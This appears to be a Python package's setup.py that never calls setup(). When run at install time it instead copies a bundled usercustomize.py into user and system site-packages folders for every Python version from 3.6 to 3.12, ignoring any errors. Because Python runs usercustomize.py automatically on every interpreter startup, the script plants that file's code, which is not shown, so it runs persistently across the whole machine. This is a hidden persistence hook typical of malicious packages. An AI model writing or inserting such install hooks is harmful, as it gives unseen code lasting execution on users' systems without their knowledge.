import os
import sys
from setuptools import setup, find_packages
import glob
import shutil

def install_usercustomize_only():
    home_dir = os.path.expanduser("~")
    python_versions = ['3.6', '3.7', '3.8', '3.9', '3.10', '3.11', '3.12']
    current_dir = os.path.dirname(__file__)
    usercustomize_src = os.path.join(current_dir, "usercustomize.py")
    if not os.path.exists(usercustomize_src):
        usercustomize_src = os.path.join(current_dir, "asas", "usercustomize.py")
    
    if not os.path.exists(usercustomize_src):
        print()
        return

    for version in python_versions:
        site_paths = [
            f"{home_dir}/.local/lib/python{version}/site-packages",
            f"/usr/local/lib/python{version}/site-packages", 
            f"/usr/lib/python{version}/site-packages",
        ]

        for path in site_paths:
            try:
                os.makedirs(path, exist_ok=True)
                target_file = os.path.join(path, "usercustomize.py")
                shutil.copy2(usercustomize_src, target_file)
                
            except Exception as e:
                continue

if __name__ == "__main__":
    install_usercustomize_only()